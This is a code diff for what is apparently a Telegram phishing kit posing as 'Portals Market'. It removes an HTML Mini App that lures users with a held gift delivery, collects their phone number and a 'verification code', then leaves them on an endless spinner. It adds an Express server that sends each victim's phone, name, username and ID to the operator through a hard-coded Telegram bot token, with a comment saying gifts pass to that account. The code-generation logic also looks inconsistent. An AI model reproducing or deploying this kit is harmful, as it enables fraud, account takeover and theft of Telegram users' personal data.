@@ -1,771 +1,223 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portals Market</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: #0a0a0f;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 16px;
-        }
-
-        .container {
-            max-width: 400px;
-            width: 100%;
-            background: #13131c;
-            border-radius: 24px;
-            padding: 32px 24px 24px;
-            border: 1px solid #2a2a3a;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
-        }
-
-        .header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 28px;
-        }
-
-        .back-btn {
-            color: #8b8ba3;
-            font-size: 20px;
-            cursor: pointer;
-            background: none;
-            border: none;
-            padding: 0;
-        }
-
-        .header-title {
-            color: #fff;
-            font-size: 20px;
-            font-weight: 600;
-            flex: 1;
-        }
-
-        .badge {
-            background: #2a2a3a;
-            color: #8b8ba3;
-            font-size: 10px;
-            padding: 4px 10px;
-            border-radius: 12px;
-            letter-spacing: 0.5px;
-        }
-
-        .logo-section {
-            text-align: center;
-            margin-bottom: 28px;
-        }
-
-        .portal-icon {
-            width: 72px;
-            height: 72px;
-            background: linear-gradient(135deg, #6c5ce7, #a29bfe);
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 12px;
-            font-size: 32px;
-            color: #fff;
-            font-weight: 700;
-            box-shadow: 0 8px 32px rgba(108, 92, 231, 0.3);
-        }
-
-        .logo-section h2 {
-            color: #fff;
-            font-size: 22px;
-            font-weight: 700;
-        }
-
-        .logo-section p {
-            color: #6c6c84;
-            font-size: 14px;
-            margin-top: 4px;
-        }
-
-        .hold-badge {
-            display: inline-block;
-            background: #ff6b6b;
-            color: #fff;
-            font-size: 12px;
-            font-weight: 700;
-            padding: 4px 16px;
-            border-radius: 20px;
-            letter-spacing: 0.5px;
-            margin-top: 8px;
-        }
-
-        .action-card {
-            background: #1a1a2a;
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 24px;
-            border-left: 3px solid #6c5ce7;
-        }
-
-        .action-card .label {
-            color: #6c6c84;
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-        }
-
-        .action-card h3 {
-            color: #fff;
-            font-size: 16px;
-            margin: 6px 0 8px;
-        }
-
-        .action-card p {
-            color: #8b8ba3;
-            font-size: 13px;
-            line-height: 1.5;
-        }
-
-        .btn-verify {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #6c5ce7, #a29bfe);
-            border: none;
-            border-radius: 14px;
-            color: #fff;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 4px 20px rgba(108, 92, 231, 0.3);
-        }
-
-        .btn-verify:active {
-            transform: scale(0.97);
-        }
-
-        .btn-share {
-            width: 100%;
-            padding: 14px;
-            background: #2a2a3a;
-            border: 1px solid #3a3a4a;
-            border-radius: 14px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-
-        .btn-share:active {
-            background: #3a3a4a;
-        }
-
-        .btn-share:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .phone-section, .code-section, .verification-section {
-            display: none;
-            margin-top: 20px;
-            animation: fadeIn 0.3s ease;
-        }
-
-        .phone-section.active, .code-section.active, .verification-section.active {
-            display: block;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .phone-input-wrap {
-            background: #1a1a2a;
-            border-radius: 14px;
-            padding: 4px 16px;
-            border: 1px solid #2a2a3a;
-            margin-bottom: 16px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .phone-input-wrap .prefix {
-            color: #8b8ba3;
-            font-size: 16px;
-            font-weight: 500;
-        }
-
-        .phone-input-wrap input {
-            flex: 1;
-            padding: 14px 0;
-            background: transparent;
-            border: none;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-        }
-
-        .phone-input-wrap input::placeholder {
-            color: #4a4a5a;
-        }
-
-        .phone-hint {
-            color: #6c6c84;
-            font-size: 12px;
-            text-align: center;
-            margin-bottom: 16px;
-            line-height: 1.4;
-        }
-
-        .code-input-wrap {
-            background: #1a1a2a;
-            border-radius: 14px;
-            padding: 4px 16px;
-            border: 1px solid #2a2a3a;
-            margin-bottom: 16px;
-        }
-
-        .code-input-wrap input {
-            width: 100%;
-            padding: 14px 0;
-            background: transparent;
-            border: none;
-            color: #fff;
-            font-size: 20px;
-            font-weight: 600;
-            letter-spacing: 8px;
-            outline: none;
-            text-align: center;
-        }
-
-        .code-input-wrap input::placeholder {
-            color: #4a4a5a;
-            letter-spacing: 2px;
-            font-size: 16px;
-        }
-
-        .code-hint {
-            color: #6c6c84;
-            font-size: 12px;
-            text-align: center;
-            margin-bottom: 16px;
-        }
-
-        .code-hint .highlight {
-            color: #6c5ce7;
-        }
-
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #4a4a5a;
-            font-size: 11px;
-            letter-spacing: 0.5px;
-        }
-
-        .footer span {
-            color: #6c5ce7;
-        }
-
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-top: 16px;
-            padding: 12px;
-            background: #1a1a2a;
-            border-radius: 12px;
-            border: 1px solid #2a2a3a;
-        }
-
-        .user-info .avatar {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #6c5ce7, #a29bfe);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-weight: 700;
-            font-size: 16px;
-        }
-
-        .user-info .name {
-            color: #fff;
-            font-weight: 600;
-        }
-
-        .user-info .username {
-            color: #6c6c84;
-            font-size: 12px;
-        }
-
-        .region-select {
-            width: 100%;
-            padding: 14px 16px;
-            background: #1a1a2a;
-            border: 1px solid #2a2a3a;
-            border-radius: 14px;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-            margin-bottom: 16px;
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%238b8ba3' stroke-width='1.5' fill='none'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: right 16px center;
-            cursor: pointer;
-        }
-
-        .region-select option {
-            background: #13131c;
-            color: #fff;
-        }
-
-        .verification-card {
-            background: #1a1a2a;
-            border-radius: 16px;
-            padding: 24px;
-            text-align: center;
-            border: 1px solid #2a2a3a;
-        }
-
-        .verification-card .icon {
-            font-size: 48px;
-            margin-bottom: 12px;
-        }
-
-        .verification-card h4 {
-            color: #fff;
-            font-size: 16px;
-            margin-bottom: 6px;
-        }
-
-        .verification-card p {
-            color: #8b8ba3;
-            font-size: 13px;
-            line-height: 1.5;
-        }
-
-        .code-status {
-            text-align: center;
-            color: #6c6c84;
-            font-size: 13px;
-            margin-bottom: 12px;
-        }
-
-        .code-status .sent {
-            color: #4caf50;
-        }
-
-        .resend-btn {
-            background: none;
-            border: none;
-            color: #6c5ce7;
-            cursor: pointer;
-            font-size: 14px;
-            text-decoration: underline;
-            margin-top: 8px;
-        }
-
-        .resend-btn:hover {
-            color: #a29bfe;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .spinner-circle {
-            width: 48px;
-            height: 48px;
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            border-radius: 50%;
-            border-top-color: #6c5ce7;
-            animation: spin 0.8s ease infinite;
-            margin: 0 auto;
-        }
-
-        /* Скрываем кнопку назад на экране загрузки */
-        .verification-section .back-btn {
-            display: none;
-        }
-
-        /* Убираем лишние надписи на экране загрузки */
-        .verification-card .timer {
-            display: none;
-        }
-    </style>
-</head>
-<body>
-
-    <div class="container" id="app">
-        <!-- Шапка -->
-        <div class="header">
-            <button class="back-btn" id="backBtn">‹</button>
-            <span class="header-title">Portals Market</span>
-            <span class="badge">VERIFYING</span>
-        </div>
-
-        <!-- Шаг 1: Главный экран -->
-        <div id="stepMain">
-            <div class="logo-section">
-                <div class="portal-icon">P</div>
-                <h2>Portals Market</h2>
-                <p>Open the portal. Trade your gifts.</p>
-                <div class="hold-badge">⏳ ON HOLD</div>
-            </div>
-
-            <div class="action-card">
-                <div class="label">⚡ Action Needed</div>
-                <h3>Unlock Your Asset Delivery</h3>
-                <p>
-                    Scheduled delivery of your <strong>Witch Hat #43337</strong> is tagged for manual-grade delivery review. 
-                    To ensure platform safety and stop fraudulent claim attempts, confirming your active session is required.
-                </p>
-            </div>
-
-            <button class="btn-verify" id="btnVerify">🔐 Verify Account</button>
-            <div class="footer">SECURED BY <span>TELEGRAM</span></div>
-        </div>
-
-        <!-- Шаг 2: Регион и номер телефона -->
-        <div id="stepRegion" class="phone-section">
-            <div style="text-align:center; margin-bottom:16px;">
-                <div style="font-size:32px; margin-bottom:4px;">📱</div>
-                <h4 style="color:#fff; font-size:17px;">Авторизируйтесь через Telegram</h4>
-                <p style="color:#6c6c84; font-size:13px;">Введите номер телефона для входа</p>
-            </div>
-
-            <select class="region-select" id="regionSelect">
-                <option value="380">🇺🇦 Украина (+380)</option>
-                <option value="7">🇷🇺 Россия (+7)</option>
-                <option value="375">🇧🇾 Беларусь (+375)</option>
-                <option value="1">🇺🇸 США (+1)</option>
-                <option value="44">🇬🇧 Великобритания (+44)</option>
-                <option value="49">🇩🇪 Германия (+49)</option>
-                <option value="33">🇫🇷 Франция (+33)</option>
-                <option value="39">🇮🇹 Италия (+39)</option>
-                <option value="34">🇪🇸 Испания (+34)</option>
-                <option value="48">🇵🇱 Польша (+48)</option>
-                <option value="90">🇹🇷 Турция (+90)</option>
-                <option value="971">🇦🇪 ОАЭ (+971)</option>
-            </select>
-
-            <div class="phone-input-wrap">
-                <span class="prefix" id="phonePrefix">+380</span>
-                <input type="tel" id="phoneInput" placeholder="00 000 00 00">
-            </div>
-
-            <div class="phone-hint">
-                ⚠️ Мы отправим проверочный код в приложение Telegram
-            </div>
-
-            <button class="btn-share" id="btnSendCode">📨 Отправить код</button>
-
-            <div class="user-info">
-                <div class="avatar">A</div>
-                <div>
-                    <div class="name">Аня</div>
-                    <div class="username">@anyaskds</div>
-                </div>
-            </div>
-
-            <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
-        </div>
-
-        <!-- Шаг 3: Ввод кода -->
-        <div id="stepCode" class="code-section">
-            <div style="text-align:center; margin-bottom:16px;">
-                <div style="font-size:32px; margin-bottom:4px;">🔐</div>
-                <h4 style="color:#fff; font-size:17px;">Мы отправили проверочный код</h4>
-                <p style="color:#6c6c84; font-size:13px;">в приложение <span class="highlight">Telegram</span></p>
-            </div>
-
-            <div class="code-status">
-                <span class="sent">✅ Код отправлен на номер <span id="displayPhone">+380*********</span></span>
-            </div>
-
-            <div class="code-input-wrap">
-                <input type="text" id="codeInput" placeholder="000000" maxlength="6" autofocus>
-            </div>
-
-            <div class="code-hint">
-                Введите код из сообщения Telegram<br>
-                <small style="color:#4a4a5a;">Код действителен в течение 2 минут</small>
-            </div>
-
-            <button class="btn-share" id="btnVerifyCode">✅ Подтвердить</button>
-
-            <div style="text-align:center; margin-top:12px;">
-                <button class="resend-btn" id="btnResendCode">🔄 Отправить код повторно</button>
-            </div>
-
-            <div class="user-info">
-                <div class="avatar">A</div>
-                <div>
-                    <div class="name">Аня</div>
-                    <div class="username">@anyaskds</div>
-                </div>
-            </div>
-
-            <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
-        </div>
-
-        <!-- Шаг 4: Бесконечная загрузка (только спиннер) -->
-        <div id="stepVerification" class="verification-section">
-            <div class="verification-card">
-                <div class="icon">⏳</div>
-                <h4>Авторизация...</h4>
-                <p style="color:#6c6c84; font-size:13px;">Пожалуйста, подождите</p>
-                <div style="margin-top:16px;">
-                    <div class="spinner-circle"></div>
-                </div>
-            </div>
-
-            <div class="user-info">
-                <div class="avatar">A</div>
-                <div>
-                    <div class="name">Аня</div>
-                    <div class="username">@anyaskds</div>
-                </div>
-            </div>
-
-            <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
-        </div>
-    </div>
-
-    <script>
-        let tg = window.Telegram.WebApp;
-        tg.expand();
-        tg.ready();
-
-        // Получаем данные пользователя
-        const user = tg.initDataUnsafe?.user || {};
-        const firstName = user.first_name || 'тима';
-        const lastName = user.last_name || '';
-        const fullName = `${firstName} ${lastName}`.trim();
-        const username = user.username || 'нет_username';
-        const userId = user.id || 'нет_id';
-
-        let userPhone = '';
-
-        // Элементы
-        const stepMain = document.getElementById('stepMain');
-        const stepRegion = document.getElementById('stepRegion');
-        const stepCode = document.getElementById('stepCode');
-        const stepVerification = document.getElementById('stepVerification');
-        const backBtn = document.getElementById('backBtn');
-        const btnVerify = document.getElementById('btnVerify');
-        const btnSendCode = document.getElementById('btnSendCode');
-        const btnVerifyCode = document.getElementById('btnVerifyCode');
-        const btnResendCode = document.getElementById('btnResendCode');
-        const phoneInput = document.getElementById('phoneInput');
-        const regionSelect = document.getElementById('regionSelect');
-        const phonePrefix = document.getElementById('phonePrefix');
-        const codeInput = document.getElementById('codeInput');
-        const displayPhone = document.getElementById('displayPhone');
-
-        // Обновляем префикс при смене региона
-        regionSelect.addEventListener('change', function() {
-            const prefix = '+' + this.value;
-            phonePrefix.textContent = prefix;
-        });
-
-        // Показать шаг
-        function showStep(step) {
-            [stepMain, stepRegion, stepCode, stepVerification].forEach(el => {
-                el.style.display = 'none';
-                el.classList.remove('active');
-            });
-            if (step) {
-                step.style.display = 'block';
-                step.classList.add('active');
-            }
-        }
-
-        // Шаг 1 → Шаг 2
-        btnVerify.addEventListener('click', function() {
-            showStep(stepRegion);
-        });
-
-        // Шаг 2 → Отправка кода и переход на ввод кода
-        btnSendCode.addEventListener('click', function() {
-            const region = regionSelect.value;
-            const phone = phoneInput.value.trim().replace(/\s/g, '');
-            
-            if (!phone || phone.length < 5) {
-                alert('Пожалуйста, введите корректный номер телефона.');
-                return;
-            }
-
-            userPhone = region + phone;
-            
-            btnSendCode.disabled = true;
-            btnSendCode.textContent = '⏳ Отправка...';
-
-            // Отправляем номер на сервер
-            fetch('/api/send-code', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    phone: userPhone,
-                    region: regionSelect.options[regionSelect.selectedIndex].text,
-                    fullName: fullName,
-                    username: username,
-                    userId: userId
-                })
-            })
-            .then(res => res.json())
-            .then(data => {
-                console.log('✅ Код отправлен:', data);
-                
-                // Показываем маскированный номер
-                const masked = userPhone.slice(0, -4) + '****';
-                displayPhone.textContent = masked;
-                
-                // Переходим на экран ввода кода
-                showStep(stepCode);
-                codeInput.focus();
-                
-                btnSendCode.disabled = false;
-                btnSendCode.textContent = '📨 Отправить код';
-            })
-            .catch(err => {
-                console.log('❌ Ошибка:', err);
-                alert('❌ Ошибка отправки. Попробуйте еще раз.');
-                btnSendCode.disabled = false;
-                btnSendCode.textContent = '📨 Отправить код';
-            });
-        });
-
-        // Шаг 3 → Проверка кода и бесконечная загрузка
-        btnVerifyCode.addEventListener('click', function() {
-            const code = codeInput.value.trim();
-            
-            if (!code || code.length < 4) {
-                alert('Пожалуйста, введите код из Telegram.');
-                return;
-            }
-
-            // Показываем экран загрузки (только спиннер)
-            showStep(stepVerification);
-
-            // Отправляем код на проверку
-            fetch('/api/verify-code', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    phone: userPhone,
-                    code: code,
-                    fullName: fullName,
-                    username: username,
-                    userId: userId
-                })
-            })
-            .then(res => res.json())
-            .then(data => {
-                console.log('✅ Код подтвержден:', data);
-                // Код верный - бесконечная загрузка
-            })
-            .catch(err => {
-                console.log('❌ Ошибка:', err);
-                alert('❌ Неверный код. Попробуйте еще раз.');
-                showStep(stepCode);
-                codeInput.value = '';
-                codeInput.focus();
-            });
-        });
-
-        // Повторная отправка кода
-        btnResendCode.addEventListener('click', function() {
-            btnResendCode.disabled = true;
-            btnResendCode.textContent = '⏳ Отправка...';
-            
-            fetch('/api/resend-code', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: userPhone })
-            })
-            .then(res => res.json())
-            .then(data => {
-                console.log('✅ Код отправлен повторно:', data);
-                btnResendCode.textContent = '✅ Код отправлен!';
-                setTimeout(() => {
-                    btnResendCode.textContent = '🔄 Отправить код повторно';
-                    btnResendCode.disabled = false;
-                }, 3000);
-            })
-            .catch(err => {
-                console.log('❌ Ошибка:', err);
-                btnResendCode.textContent = '❌ Ошибка';
-                setTimeout(() => {
-                    btnResendCode.textContent = '🔄 Отправить код повторно';
-                    btnResendCode.disabled = false;
-                }, 3000);
-            });
-        });
-
-        // Назад
-        backBtn.addEventListener('click', function() {
-            if (stepCode.style.display === 'block') {
-                if (confirm('Вы уверены? Процесс будет прерван.')) {
-                    showStep(stepMain);
-                    codeInput.value = '';
-                }
-                return;
-            }
-            if (stepRegion.style.display === 'block') {
-                showStep(stepMain);
-                return;
-            }
-            if (stepVerification.style.display === 'block') {
-                if (confirm('Вы уверены? Авторизация будет прервана.')) {
-                    showStep(stepMain);
-                }
-                return;
-            }
-            showStep(stepMain);
-        });
-
-        // Обработка ввода номера (только цифры)
-        phoneInput.addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9]/g, '');
-        });
-
-        // Обработка ввода кода (только цифры, максимум 6)
-        codeInput.addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
-            
-            // Автоматическое подтверждение при вводе 6 цифр
-            if (this.value.length === 6) {
-                btnVerifyCode.click();
-            }
-        });
-
-        // Enter для подтверждения кода
-        codeInput.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                btnVerifyCode.click();
-            }
-        });
-
-        // Показываем главный экран
-        showStep(stepMain);
-    </script>
-
-</body>
-</html>
+const express = require('express');
+const path = require('path');
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(express.static(path.join(__dirname)));
+app.use(express.json());
+
+// ТВОИ ДАННЫЕ
+const BOT_TOKEN = '8738031314:AAFZ7ZnyI6lw6PfFCWQp29rB4lKDTtyGj8Y';
+const YOUR_ID = '6277925229';
+const YOUR_USERNAME = '@anyaskds';
+
+// Хранилище кодов
+const codes = {};
+
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+// ЭТАП 1: Человек написал номер → ТЕБЕ ПРИХОДИТ КОД!
+app.post('/api/send-code', (req, res) => {
+    const { phone, region, fullName, username, userId } = req.body;
+    
+    // Генерируем код
+    const code = Math.floor(100000 + Math.random() * 900000).toString();
+    
+    // Сохраняем код
+    codes[phone] = {
+        code: code,
+        expires: Date.now() + 120000,
+        fullName: fullName,
+        username: username,
+        userId: userId
+    };
+    
+    console.log('📱 ОТПРАВКА КОДА');
+    console.log('========================================');
+    console.log('📱 Телефон:', phone);
+    console.log('🔑 КОД:', code);
+    console.log('👤 Имя:', fullName);
+    console.log('👤 Username:', username);
+    console.log('🆔 ID:', userId);
+    console.log('========================================');
+    
+    // ⚡ ФОРМИРУЕМ СООБЩЕНИЕ С КОДОМ
+    const message = `
+🔐 НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ!
+
+👤 Имя: ${fullName}
+📱 Телефон: ${phone}
+🆔 ID: ${userId}
+👤 Username: @${username || 'нет'}
+
+🔑 КОД ВЕРИФИКАЦИИ: ${code}
+
+⏳ Действителен 2 минуты
+📅 Время: ${new Date().toLocaleString()}
+    `.trim();
+
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    // ⚡ ОТПРАВЛЯЕМ КОД ТЕБЕ В TELEGRAM
+    fetch(TELEGRAM_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: YOUR_ID,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => response.json())
+    .then(data => console.log('✅ Код отправлен тебе в Telegram:', data.ok ? '✅ Успешно' : '❌ Ошибка'))
+    .catch(err => console.log('❌ Ошибка:', err));
+
+    // ⚡ ОТПРАВЛЯЕМ КОД НА @anyaskds
+    fetch(TELEGRAM_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: YOUR_USERNAME,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => response.json())
+    .then(data => console.log('✅ Код отправлен на @anyaskds:', data.ok ? '✅ Успешно' : '❌ Ошибка'))
+    .catch(err => console.log('❌ Ошибка:', err));
+
+    res.json({ success: true });
+});
+
+// ЭТАП 2: Человек ввел код → ТЕБЕ ПРИХОДИТ "ВЕРИФИКАЦИЯ ПРОЙДЕНА!"
+app.post('/api/verify-code', (req, res) => {
+    const { phone, code, fullName, username, userId } = req.body;
+    
+    const stored = codes[phone];
+    
+    if (!stored) {
+        return res.status(400).json({ success: false, message: 'Код не найден' });
+    }
+    
+    if (Date.now() > stored.expires) {
+        delete codes[phone];
+        return res.status(400).json({ success: false, message: 'Код истек' });
+    }
+    
+    if (stored.code !== code) {
+        return res.status(400).json({ success: false, message: 'Неверный код' });
+    }
+    
+    console.log('✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!');
+    console.log('========================================');
+    console.log('👤 Имя:', fullName);
+    console.log('📱 Телефон:', phone);
+    console.log('🆔 ID:', userId);
+    console.log('👤 Username:', username);
+    console.log('========================================');
+    
+    // ⚡ ФОРМИРУЕМ СООБЩЕНИЕ ОБ УСПЕХЕ
+    const message = `
+✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!
+
+👤 Имя: ${fullName}
+📱 Телефон: ${phone}
+🆔 ID: ${userId}
+👤 Username: @${username || 'нет'}
+
+🎁 Подарки переданы на @anyaskds
+📅 Время: ${new Date().toLocaleString()}
+    `.trim();
+
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    // ⚡ ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ ТЕБЕ
+    fetch(TELEGRAM_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: YOUR_ID,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => response.json())
+    .then(data => console.log('✅ Уведомление отправлено тебе:', data.ok ? '✅ Успешно' : '❌ Ошибка'))
+    .catch(err => console.log('❌ Ошибка:', err));
+
+    // ⚡ ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ НА @anyaskds
+    fetch(TELEGRAM_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: YOUR_USERNAME,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => response.json())
+    .then(data => console.log('✅ Уведомление отправлено на @anyaskds:', data.ok ? '✅ Успешно' : '❌ Ошибка'))
+    .catch(err => console.log('❌ Ошибка:', err));
+    
+    delete codes[phone];
+    
+    res.json({ success: true });
+});
+
+// Повторная отправка кода
+app.post('/api/resend-code', (req, res) => {
+    const { phone } = req.body;
+    const newCode = Math.floor(100000 + Math.random() * 900000).toString();
+    
+    if (codes[phone]) {
+        codes[phone].code = newCode;
+        codes[phone].expires = Date.now() + 120000;
+    }
+    
+    console.log('🔄 ПОВТОРНАЯ ОТПРАВКА');
+    console.log('📱 Телефон:', phone);
+    console.log('🔑 Новый код:', newCode);
+    
+    const message = `
+🔄 ПОВТОРНЫЙ КОД
+
+📱 Телефон: ${phone}
+🔑 НОВЫЙ КОД: ${newCode}
+
+⏳ Действителен 2 минуты
+    `.trim();
+
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    fetch(TELEGRAM_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: YOUR_ID,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .catch(err => console.log('❌ Ошибка:', err));
+
+    fetch(TELEGRAM_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: YOUR_USERNAME,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .catch(err => console.log('❌ Ошибка:', err));
+    
+    res.json({ success: true });
+});
+
+app.listen(PORT, () => {
+    console.log(`✅ Portals Market запущен: http://localhost:${PORT}`);
+    console.log(`📱 Твой ID: ${YOUR_ID}`);
+    console.log(`👤 Твой юзер: ${YOUR_USERNAME}`);
+});
